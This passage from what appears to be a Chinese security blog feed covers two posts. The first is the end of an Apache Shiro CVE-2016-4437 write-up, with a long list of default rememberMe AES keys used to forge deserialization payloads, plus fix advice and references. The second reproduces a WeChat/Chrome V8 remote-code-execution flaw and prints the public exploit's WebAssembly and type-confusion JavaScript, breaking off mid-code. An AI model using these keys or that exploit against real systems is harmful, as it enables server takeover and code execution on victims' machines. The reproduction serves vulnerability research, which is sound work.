class="line">9AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">OUHYQzxQ&#x2F;W9e&#x2F;UjiAGu6rg&#x3D;&#x3D;</span><br><span class="line">a3dvbmcAAAAAAAAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">aU1pcmFjbGVpTWlyYWNsZQ&#x3D;&#x3D;</span><br><span class="line">bXRvbnMAAAAAAAAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">OY&#x2F;&#x2F;C4rhfwNxCQAQCrQQ1Q&#x3D;&#x3D;</span><br><span class="line">5J7bIJIV0LQSN3c9LPitBQ&#x3D;&#x3D;</span><br><span class="line">f&#x2F;SY5TIve5WWzT4aQlABJA&#x3D;&#x3D;</span><br><span class="line">bya2HkYo57u6fWh5theAWw&#x3D;&#x3D;</span><br><span class="line">WuB+y2gcHRnY2Lg9+Aqmqg&#x3D;&#x3D;</span><br><span class="line">3qDVdLawoIr1xFd6ietnwg&#x3D;&#x3D;</span><br><span class="line">YI1+nBV&#x2F;&#x2F;m7ELrIyDHm6DQ&#x3D;&#x3D;</span><br><span class="line">6Zm+6I2j5Y+R5aS+5ZOlAA&#x3D;&#x3D;</span><br><span class="line">2A2V+RFLUs+eTA3Kpr+dag&#x3D;&#x3D;</span><br><span class="line">6ZmI6I2j3Y+R1aSn5BOlAA&#x3D;&#x3D;</span><br><span class="line">SkZpbmFsQmxhZGUAAAAAAA&#x3D;&#x3D;</span><br><span class="line">2cVtiE83c4lIrELJwKGJUw&#x3D;&#x3D;</span><br><span class="line">fsHspZw&#x2F;92PrS3XrPW+vxw&#x3D;&#x3D;</span><br><span class="line">XTx6CKLo&#x2F;SdSgub+OPHSrw&#x3D;&#x3D;</span><br><span class="line">sHdIjUN6tzhl8xZMG3ULCQ&#x3D;&#x3D;</span><br><span class="line">O4pdf+7e+mZe8NyxMTPJmQ&#x3D;&#x3D;</span><br><span class="line">HWrBltGvEZc14h9VpMvZWw&#x3D;&#x3D;</span><br><span class="line">rPNqM6uKFCyaL10AK51UkQ&#x3D;&#x3D;</span><br><span class="line">Y1JxNSPXVwMkyvES&#x2F;kJGeQ&#x3D;&#x3D;</span><br><span class="line">lT2UvDUmQwewm6mMoiw4Ig&#x3D;&#x3D;</span><br><span class="line">MPdCMZ9urzEA50JDlDYYDg&#x3D;&#x3D;</span><br><span class="line">xVmmoltfpb8tTceuT5R7Bw&#x3D;&#x3D;</span><br><span class="line">c+3hFGPjbgzGdrC+MHgoRQ&#x3D;&#x3D;</span><br><span class="line">ClLk69oNcA3m+s0jIMIkpg&#x3D;&#x3D;</span><br><span class="line">Bf7MfkNR0axGGptozrebag&#x3D;&#x3D;</span><br><span class="line">1tC&#x2F;xrDYs8ey+sa3emtiYw&#x3D;&#x3D;</span><br><span class="line">ZmFsYWRvLnh5ei5zaGlybw&#x3D;&#x3D;</span><br><span class="line">cGhyYWNrY3RmREUhfiMkZA&#x3D;&#x3D;</span><br><span class="line">IduElDUpDDXE677ZkhhKnQ&#x3D;&#x3D;</span><br><span class="line">yeAAo1E8BOeAYfBlm4NG9Q&#x3D;&#x3D;</span><br><span class="line">cGljYXMAAAAAAAAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">2itfW92XazYRi5ltW0M2yA&#x3D;&#x3D;</span><br><span class="line">XgGkgqGqYrix9lI6vxcrRw&#x3D;&#x3D;</span><br><span class="line">ertVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">5AvVhmFLUS0ATA4Kprsdag&#x3D;&#x3D;</span><br><span class="line">s0KTA3mFLUprK4AvVhsdag&#x3D;&#x3D;</span><br><span class="line">hBlzKg78ajaZuTE0VLzDDg&#x3D;&#x3D;</span><br><span class="line">9FvVhtFLUs0KnA3Kprsdyg&#x3D;&#x3D;</span><br><span class="line">d2ViUmVtZW1iZXJNZUtleQ&#x3D;&#x3D;</span><br><span class="line">yNeUgSzL&#x2F;CfiWw1GALg6Ag&#x3D;&#x3D;</span><br><span class="line">NGk&#x2F;3cQ6F5&#x2F;UNPRh8LpMIg&#x3D;&#x3D;</span><br><span class="line">4BvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">MzVeSkYyWTI2OFVLZjRzZg&#x3D;&#x3D;</span><br><span class="line">empodDEyMwAAAAAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">A7UzJgh1+EWj5oBFi+mSgw&#x3D;&#x3D;</span><br><span class="line">c2hpcm9fYmF0aXMzMgAAAA&#x3D;&#x3D;</span><br><span class="line">i45FVt72K2kLgvFrJtoZRw&#x3D;&#x3D;</span><br><span class="line">U3BAbW5nQmxhZGUAAAAAAA&#x3D;&#x3D;</span><br><span class="line">Jt3C93kMR9D5e8QzwfsiMw&#x3D;&#x3D;</span><br><span class="line">MTIzNDU2NzgxMjM0NTY3OA&#x3D;&#x3D;</span><br><span class="line">vXP33AonIp9bFwGl7aT7rA&#x3D;&#x3D;</span><br><span class="line">V2hhdCBUaGUgSGVsbAAAAA&#x3D;&#x3D;</span><br><span class="line">Q01TX0JGTFlLRVlfMjAxOQ&#x3D;&#x3D;</span><br><span class="line">Is9zJ3pzNh2cgTHB4ua3+Q&#x3D;&#x3D;</span><br><span class="line">NsZXjXVklWPZwOfkvk6kUA&#x3D;&#x3D;</span><br><span class="line">GAevYnznvgNCURavBhCr1w&#x3D;&#x3D;</span><br><span class="line">66v1O8keKNV3TTcGPK1wzg&#x3D;&#x3D;</span><br><span class="line">SDKOLKn2J1j&#x2F;2BHjeZwAoQ&#x3D;&#x3D;</span><br><span class="line">kPH+bIxk5D2deZiIxcabaA&#x3D;&#x3D;</span><br><span class="line">kPH+bIxk5D2deZiIxcacaA&#x3D;&#x3D;</span><br><span class="line">3AvVhdAgUs0FSA4SDFAdBg&#x3D;&#x3D;</span><br><span class="line">4AvVhdsgUs0F563SDFAdag&#x3D;&#x3D;</span><br><span class="line">FL9HL9Yu5bVUJ0PDU1ySvg&#x3D;&#x3D;</span><br><span class="line">5RC7uBZLkByfFfJm22q&#x2F;Zw&#x3D;&#x3D;</span><br><span class="line">eXNmAAAAAAAAAAAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">fdCEiK9YvLC668sS43CJ6A&#x3D;&#x3D;</span><br><span class="line">FJoQCiz0z5XWz2N2LyxNww&#x3D;&#x3D;</span><br><span class="line">HeUZ&#x2F;LvgkO7nsa18ZyVxWQ&#x3D;&#x3D;</span><br><span class="line">HoTP07fJPKIRLOWoVXmv+Q&#x3D;&#x3D;</span><br><span class="line">iycgIIyCatQofd0XXxbzEg&#x3D;&#x3D;</span><br><span class="line">m0&#x2F;5ZZ9L4jjQXn7MREr&#x2F;bw&#x3D;&#x3D;</span><br><span class="line">NoIw91X9GSiCrLCF03ZGZw&#x3D;&#x3D;</span><br><span class="line">oPH+bIxk5E2enZiIxcqaaA&#x3D;&#x3D;</span><br><span class="line">QAk0rp8sG0uJC4Ke2baYNA&#x3D;&#x3D;</span><br><span class="line">Rb5RN+LofDWJlzWAwsXzxg&#x3D;&#x3D;</span><br><span class="line">s2SE9y32PvLeYo+VGFpcKA&#x3D;&#x3D;</span><br><span class="line">SrpFBcVD89eTQ2icOD0TMg&#x3D;&#x3D;</span><br><span class="line">U0hGX2d1bnMAAAAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">Us0KvVhTeasAm43KFLAeng&#x3D;&#x3D;</span><br><span class="line">Ymx1ZXdoYWxlAAAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">YWJjZGRjYmFhYmNkZGNiYQ&#x3D;&#x3D;</span><br><span class="line">zIiHplamyXlVB11UXWol8g&#x3D;&#x3D;</span><br><span class="line">ZjQyMTJiNTJhZGZmYjFjMQ&#x3D;&#x3D;</span><br><span class="line">kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D; </span><br><span class="line">4AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D; </span><br><span class="line">WkhBTkdYSUFPSEVJX0NBVA&#x3D;&#x3D; </span><br><span class="line">U3ByaW5nQmxhZGUAAAAAAA&#x3D;&#x3D; </span><br><span class="line">cGljYXMAAAAAAAAAAAAAAA&#x3D;&#x3D; </span><br><span class="line">d2ViUmVtZW1iZXJNZUtleQ&#x3D;&#x3D; </span><br><span class="line">fsHspZw&#x2F;92PrS3XrPW+vxw&#x3D;&#x3D; </span><br><span class="line">sHdIjUN6tzhl8xZMG3ULCQ&#x3D;&#x3D; </span><br><span class="line">WuB+y2gcHRnY2Lg9+Aqmqg&#x3D;&#x3D; </span><br><span class="line">ertVhmFLUs0KTA3Kprsdag&#x3D;&#x3D; </span><br><span class="line">2itfW92XazYRi5ltW0M2yA&#x3D;&#x3D; </span><br><span class="line">6ZmI6I2j3Y+R1aSn5BOlAA&#x3D;&#x3D; </span><br><span class="line">f&#x2F;SY5TIve5WWzT4aQlABJA&#x3D;&#x3D; </span><br><span class="line">Jt3C93kMR9D5e8QzwfsiMw&#x3D;&#x3D; </span><br><span class="line">aU1pcmFjbGVpTWlyYWNsZQ&#x3D;&#x3D; </span><br><span class="line">XTx6CKLo&#x2F;SdSgub+OPHSrw&#x3D;&#x3D; </span><br><span class="line">8AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D; </span><br><span class="line">66v1O8keKNV3TTcGPK1wzg&#x3D;&#x3D; </span><br><span class="line">Q01TX0JGTFlLRVlfMjAxOQ&#x3D;&#x3D; </span><br><span class="line">5AvVhmFLUS0ATA4Kprsdag&#x3D;&#x3D; </span><br><span class="line">ZmFsYWRvLnh5ei5zaGlybw&#x3D;&#x3D; </span><br><span class="line">0AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D; </span><br><span class="line">r0e3c16IdVkouZgk1TKVMg&#x3D;&#x3D; </span><br><span class="line">Z3VucwAAAAAAAAAAAAAAAA&#x3D;&#x3D; </span><br><span class="line">5J7bIJIV0LQSN3c9LPitBQ&#x3D;&#x3D; </span><br><span class="line">ZnJlc2h6Y24xMjM0NTY3OA&#x3D;&#x3D; </span><br><span class="line">yeAAo1E8BOeAYfBlm4NG9Q&#x3D;&#x3D; </span><br><span class="line">a3dvbmcAAAAAAAAAAAAAAA&#x3D;&#x3D; </span><br><span class="line">4BvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D; </span><br><span class="line">s0KTA3mFLUprK4AvVhsdag&#x3D;&#x3D; </span><br><span class="line">yNeUgSzL&#x2F;CfiWw1GALg6Ag&#x3D;&#x3D; </span><br><span class="line">OY&#x2F;&#x2F;C4rhfwNxCQAQCrQQ1Q&#x3D;&#x3D; </span><br><span class="line">fCq+&#x2F;xW488hMTCD+cmJ3aQ&#x3D;&#x3D; </span><br><span class="line">ZAvph3dsQs0FSL3SDFAdag&#x3D;&#x3D; </span><br><span class="line">MTIzNDU2NzgxMjM0NTY3OA&#x3D;&#x3D; </span><br><span class="line">1AvVhdsgUs0FSA3SDFAdag&#x3D;&#x3D; </span><br><span class="line">Bf7MfkNR0axGGptozrebag&#x3D;&#x3D; </span><br><span class="line">1QWLxg+NYmxraMoxAXu&#x2F;Iw&#x3D;&#x3D; </span><br><span class="line">6AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D; </span><br><span class="line">6NfXkC7YVCV5DASIrEm1Rg&#x3D;&#x3D; </span><br><span class="line">2AvVhdsgUs0FSA3SDFAdag&#x3D;&#x3D; </span><br><span class="line">9FvVhtFLUs0KnA3Kprsdyg&#x3D;&#x3D; </span><br><span class="line">OUHYQzxQ&#x2F;W9e&#x2F;UjiAGu6rg&#x3D;&#x3D; </span><br><span class="line">ClLk69oNcA3m+s0jIMIkpg&#x3D;&#x3D; </span><br><span class="line">vXP33AonIp9bFwGl7aT7rA&#x3D;&#x3D; </span><br><span class="line">NGk&#x2F;3cQ6F5&#x2F;UNPRh8LpMIg&#x3D;&#x3D; </span><br><span class="line">MPdCMZ9urzEA50JDlDYYDg&#x3D;&#x3D; </span><br><span class="line">c2hpcm9fYmF0aXMzMgAAAA&#x3D;&#x3D; </span><br><span class="line">XgGkgqGqYrix9lI6vxcrRw&#x3D;&#x3D; </span><br><span class="line">2A2V+RFLUs+eTA3Kpr+dag&#x3D;&#x3D; </span><br><span class="line">5AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D; </span><br><span class="line">3AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D; </span><br><span class="line">WcfHGU25gNnTxTlmJMeSpw&#x3D;&#x3D; </span><br><span class="line">bWljcm9zAAAAAAAAAAAAAA&#x3D;&#x3D; </span><br><span class="line">bWluZS1hc3NldC1rZXk6QQ&#x3D;&#x3D; </span><br><span class="line">bXRvbnMAAAAAAAAAAAAAAA&#x3D;&#x3D; </span><br><span class="line">6ZmI6I2j5Y+R5aSn5ZOlAA&#x3D;&#x3D; </span><br><span class="line">3JvYhmBLUs0ETA5Kprsdag&#x3D;&#x3D; </span><br><span class="line">A7UzJgh1+EWj5oBFi+mSgw&#x3D;&#x3D; </span><br><span class="line">Is9zJ3pzNh2cgTHB4ua3+Q&#x3D;&#x3D; </span><br><span class="line">25BsmdYwjnfcWmnhAciDDg&#x3D;&#x3D; </span><br><span class="line">cmVtZW1iZXJNZQAAAAAAAA&#x3D;&#x3D; </span><br><span class="line">7AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D; </span><br><span class="line">3qDVdLawoIr1xFd6ietnwg&#x3D;&#x3D; </span><br><span class="line">Y1JxNSPXVwMkyvES&#x2F;kJGeQ&#x3D;&#x3D; </span><br><span class="line">xVmmoltfpb8tTceuT5R7Bw&#x3D;&#x3D; </span><br><span class="line">O4pdf+7e+mZe8NyxMTPJmQ&#x3D;&#x3D; </span><br><span class="line">SDKOLKn2J1j&#x2F;2BHjeZwAoQ&#x3D;&#x3D; </span><br><span class="line">a2VlcE9uR29pbmdBbmRGaQ&#x3D;&#x3D; </span><br><span class="line">V2hhdCBUaGUgSGVsbAAAAA&#x3D;&#x3D; </span><br><span class="line">GAevYnznvgNCURavBhCr1w&#x3D;&#x3D; </span><br><span class="line">hBlzKg78ajaZuTE0VLzDDg&#x3D;&#x3D; </span><br><span class="line">2cVtiE83c4lIrELJwKGJUw&#x3D;&#x3D; </span><br><span class="line">9AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D; </span><br><span class="line">SkZpbmFsQmxhZGUAAAAAAA&#x3D;&#x3D; </span><br><span class="line">lT2UvDUmQwewm6mMoiw4Ig&#x3D;&#x3D; </span><br><span class="line">HWrBltGvEZc14h9VpMvZWw&#x3D;&#x3D; </span><br><span class="line">8BvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D; </span><br><span class="line">bya2HkYo57u6fWh5theAWw&#x3D;&#x3D; </span><br><span class="line">IduElDUpDDXE677ZkhhKnQ&#x3D;&#x3D; </span><br><span class="line">1tC&#x2F;xrDYs8ey+sa3emtiYw&#x3D;&#x3D; </span><br><span class="line">MTIzNDU2Nzg5MGFiY2RlZg&#x3D;&#x3D; </span><br><span class="line">c+3hFGPjbgzGdrC+MHgoRQ&#x3D;&#x3D; </span><br><span class="line">rPNqM6uKFCyaL10AK51UkQ&#x3D;&#x3D; </span><br><span class="line">5aaC5qKm5oqA5pyvAAAAAA&#x3D;&#x3D; </span><br><span class="line">cGhyYWNrY3RmREUhfiMkZA&#x3D;&#x3D; </span><br><span class="line">MzVeSkYyWTI2OFVLZjRzZg&#x3D;&#x3D; </span><br><span class="line">YI1+nBV&#x2F;&#x2F;m7ELrIyDHm6DQ&#x3D;&#x3D; </span><br><span class="line">empodDEyMwAAAAAAAAAAAA&#x3D;&#x3D; </span><br><span class="line">NsZXjXVklWPZwOfkvk6kUA&#x3D;&#x3D; </span><br><span class="line">ZUdsaGJuSmxibVI2ZHc9PQ&#x3D;&#x3D; </span><br><span class="line">L7RioUULEFhRyxM7a2R&#x2F;Yg&#x3D;&#x3D; </span><br><span class="line">i45FVt72K2kLgvFrJtoZRw&#x3D;&#x3D; </span><br><span class="line">zSyK5Kp6PZAAjlT+eeNMlg&#x3D;&#x3D; </span><br><span class="line">kPv59vyqzj00x11LXJZTjJ2UHW48jzHN </span><br><span class="line">wGiHplamyXlVB11UXWol8g&#x3D;&#x3D; </span><br><span class="line">6Zm+6I2j5Y+R5aS+5ZOlAA&#x3D;&#x3D; </span><br><span class="line">U3BAbW5nQmxhZGUAAAAAAA&#x3D;&#x3D; </span><br><span class="line">2adsfasdqerqerqewradsf&#x3D;&#x3D;</span><br><span class="line">2AvVCXsxUs0FSA7SYFjdQg&#x3D;&#x3D;</span><br><span class="line">2AvVhdsgERdsSA3SDFAdag&#x3D;&#x3D;</span><br><span class="line">2AvVhdsgUs0FSA3SaFAdfg&#x3D;&#x3D;</span><br><span class="line">2AvVhdsgUs0FSA3SDFAder&#x3D;&#x3D;</span><br><span class="line">2AvVhdsgUsOFSA3SDFAdag&#x3D;&#x3D;</span><br><span class="line">2AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">2AvVidsaUSofSA3SDFAdog&#x3D;&#x3D;</span><br><span class="line">3Av2hmFLAs0BTA3Kprsd6E&#x3D;&#x3D;</span><br><span class="line">3AvVhdAgUs1FSA4SDFAdBg&#x3D;&#x3D;</span><br><span class="line">3AvVhMFLIs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">3AvVhmFLUs0KTA3KaTHGFg&#x3D;&#x3D;</span><br><span class="line">3AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">3qDVdLawoIr1xFd6ietnsg&#x3D;&#x3D;</span><br><span class="line">3rvVhmFLUs0KAT3Kprsdag&#x3D;&#x3D;</span><br><span class="line">4AvVhm2LUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">4AvVhmFLUs0KTA3KAAAAAA&#x3D;&#x3D;</span><br><span class="line">4AvVhmFLUs0KTA3Kprseaf&#x3D;&#x3D;</span><br><span class="line">4AvVhmFLUs0TTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">4AvVhmFLUs5KTA1Kprsdag&#x3D;&#x3D;</span><br><span class="line">4AvVhmFLUsOKTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">4rvVhmFLUs0KAT3Kprsdag&#x3D;&#x3D;</span><br><span class="line">4WCZSJyqdUQsije93aQIRg&#x3D;&#x3D;</span><br><span class="line">5AvVhCsgUs0FSA3SDFAdag&#x3D;&#x3D;</span><br><span class="line">5oiR5piv5p2h5ZK46bG8IQ&#x3D;&#x3D;</span><br><span class="line">8AvVhdsgUs0FSA3SDFAdag&#x3D;&#x3D;</span><br><span class="line">9Ami6v2G5Y+r5aPnE4OlBB&#x3D;&#x3D;</span><br><span class="line">9AVvhnFLuS3KTV8KprsdAg&#x3D;&#x3D;</span><br><span class="line">a69ec781563b1a5d791f7b2bdd117a36</span><br><span class="line">AF05JAuyuEB1ouJQ9Y9Phg&#x3D;&#x3D;</span><br><span class="line">aG91c2Vob3VzZWhvdXNlMg&#x3D;&#x3D;</span><br><span class="line">A+kWR7o9O0&#x2F;G&#x2F;W6aOGesRA&#x3D;&#x3D;</span><br><span class="line">AztiX2RUqhc7dhOzl1Mj8Q&#x3D;&#x3D;</span><br><span class="line">b2EAAAAAAAAAAAAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">B9rPF8FHhxKJZ9k63ik7kQ&#x3D;&#x3D;</span><br><span class="line">c2hvdWtlLXBsdXMuMjAxNg&#x3D;&#x3D;</span><br><span class="line">Cj6LnKZNLEowAZrdqyH&#x2F;Ew&#x3D;&#x3D;</span><br><span class="line">duhfin37x6chw29jsne45m&#x3D;&#x3D;</span><br><span class="line">fCq+&#x2F;xW488hMTCE+cmJ3FF&#x3D;&#x3D;</span><br><span class="line">FjbNm1avvGmWE9CY2HqV75&#x3D;&#x3D;</span><br><span class="line">FP7qKJzdJOGkzoQzo2wTmA&#x3D;&#x3D;</span><br><span class="line">GhrF5zLfq1Dtadd1jlohhA&#x3D;&#x3D;</span><br><span class="line">GHxH6G3LFh8Zb3NwoRgfFA&#x3D;&#x3D;</span><br><span class="line">HOlg7NHb9potm0n5s4ic0Q&#x3D;&#x3D;</span><br><span class="line">kPv59vyqzj00x11LXJZTjJ2UHW48jzHN</span><br><span class="line">lt181dcQVz&#x2F;Bo9Wb8ws&#x2F;Cg&#x3D;&#x3D;</span><br><span class="line">M2djA70UBBUPDibGZBRvrA&#x3D;&#x3D;</span><br><span class="line">mIccZhQt6EBHrZIyw1FAXQ&#x3D;&#x3D;</span><br><span class="line">pbnA+Qzen1vjV3rNqQBLHg&#x3D;&#x3D;</span><br><span class="line">pyyX1c5x2f0LZZ7VKZXjKO&#x3D;&#x3D;</span><br><span class="line">QDFCnfkLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">QF5HMyZAWDZYRyFnSGhTdQ&#x3D;&#x3D;</span><br><span class="line">qQFtSnnj&#x2F;sx7vu51ixAyEQ&#x3D;&#x3D;</span><br><span class="line">QUxQSEFNWVNPRlRCVUlMRA&#x3D;&#x3D;</span><br><span class="line">QVN1bm5uJ3MgU3Vuc2l0ZQ&#x3D;&#x3D;</span><br><span class="line">R29yZG9uV2ViAAAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">sBv2t3okbdm3U0r2EVcSzB&#x3D;&#x3D;</span><br><span class="line">sgIQrqUVxa1OZRRIK3hLZw&#x3D;&#x3D;</span><br><span class="line">TGMPe7lGO&#x2F;Gbr38QiJu1&#x2F;w&#x3D;&#x3D;</span><br><span class="line">UGlzMjAxNiVLeUVlXiEjLw&#x3D;&#x3D;</span><br><span class="line">w793pPq5ZVBKkj8OhV4KaQ&#x3D;&#x3D;</span><br><span class="line">wrjUh2ttBPQLnT4JVhriug&#x3D;&#x3D;</span><br><span class="line">wyLZMDifwq3sW1vhhHpgKA&#x3D;&#x3D;</span><br><span class="line">YnlhdnMAAAAAAAAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">YVd4dmRtVjViM1UlM0QIdn&#x3D;&#x3D;</span><br><span class="line">YWdlbnRAZG1AMjAxOHN3Zg&#x3D;&#x3D;</span><br><span class="line">YystomRZLMUjiK0Q1+LFdw&#x3D;&#x3D;</span><br><span class="line">Z3VucwAAAAAAAAAAAAABBB&#x3D;&#x3D;</span><br><span class="line">Z3VucwACAOVAKALACAADSA&#x3D;&#x3D;</span><br><span class="line">ZGdmdwAAAAAAAAAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">ZUdsaGJuSmxibVI2ZHc9PQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><hr><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><ul><li>升级版本高于1.2.5</li><li>不使用默认key</li></ul><hr><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://issues.apache.org/jira/browse/SHIRO-550">https://issues.apache.org/jira/browse/SHIRO-550</a></li><li><a href="https://vulhub.org/#/environments/shiro/CVE-2016-4437/">https://vulhub.org/#/environments/shiro/CVE-2016-4437/</a></li><li><a href="https://xz.aliyun.com/t/7793">https://xz.aliyun.com/t/7793</a></li><li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4437">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4437</a></li><li><a href="https://paper.seebug.org/shiro-rememberme-1-2-4/">https://paper.seebug.org/shiro-rememberme-1-2-4/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> shiro </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信-Chrome远程代码执行</title>
      <link href="2021/04/23/%E5%BE%AE%E4%BF%A1-Chrome%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
      <url>2021/04/23/%E5%BE%AE%E4%BF%A1-Chrome%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="微信-Chrome远程代码执行"><a href="#微信-Chrome远程代码执行" class="headerlink" title="微信-Chrome远程代码执行"></a>微信-Chrome远程代码执行</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2021年04月13日,国外安全研究员发布了Chrome 远程代码执行 0Day的POC详情，后又爆出微信内置浏览器用的就是低版本Chrome内核，且默认关闭沙盒–no-sandbox，正好能够结合Chrome漏洞进行利用，这里借着这个时间来复现一下这个漏洞。</p><h2 id="Chrome漏洞复现"><a href="#Chrome漏洞复现" class="headerlink" title="Chrome漏洞复现"></a>Chrome漏洞复现</h2><p>国外安全研究员发布了Chrome远程代码执行0Day漏洞的POC详情，漏洞为“严重”级别。攻击者利用此漏洞，构造一个恶意的web页面，用户访问该页面时，会造成远程代码执行。</p><p>大量采用Chrome内核的浏览器同样也会受此漏洞影响，如微软的Edge浏览器，影响版本：Chrome: &lt;=89.0.4389.114，可通过在Chrome浏览器中输入chrome://version查看版本等信息。</p><p><img src="/images/pasted-13.png"></p><p>本地测试版本：89.0.4389.9，这个漏洞利用条件是必须关闭Chrome浏览器沙盒–no-sandbox，默认为开启状态，所以一般用户不会受此漏洞影响。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chrome.exe -no-sandbox</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-15.png"></p><p>POC验证（弹计算器）：<a href="https://github.com/r4j0x00/exploits/tree/master/chrome-0day">https://github.com/r4j0x00/exploits/tree/master/chrome-0day</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">var wasm_code &#x3D; new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])</span><br><span class="line">var wasm_mod &#x3D; new WebAssembly.Module(wasm_code);</span><br><span class="line">var wasm_instance &#x3D; new WebAssembly.Instance(wasm_mod);</span><br><span class="line">var f &#x3D; wasm_instance.exports.main;</span><br><span class="line"></span><br><span class="line">var buf &#x3D; new ArrayBuffer(8);</span><br><span class="line">var f64_buf &#x3D; new Float64Array(buf);</span><br><span class="line">var u64_buf &#x3D; new Uint32Array(buf);</span><br><span class="line">let buf2 &#x3D; new ArrayBuffer(0x150);</span><br><span class="line"></span><br><span class="line">function ftoi(val) &#123;</span><br><span class="line">    f64_buf[0] &#x3D; val;</span><br><span class="line">    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) &lt;&lt; 32n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function itof(val) &#123;</span><br><span class="line">    u64_buf[0] &#x3D; Number(val &amp; 0xffffffffn);</span><br><span class="line">    u64_buf[1] &#x3D; Number(val &gt;&gt; 32n);</span><br><span class="line">    return f64_buf[0];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const _arr &#x3D; new Uint32Array([2**31]);</span><br><span class="line"></span><br><span class="line">function foo(a) &#123;</span><br><span class="line">    var x &#x3D; 1;</span><br><span class="line">x &#x3D; (_arr[0] ^ 0) + 1;</span><br><span class="line"></span><br><span class="line">x &#x3D; Math.abs(x);</span><br><span class="line">x -&#x3D; 2147483647;</span><br><span class="line">x 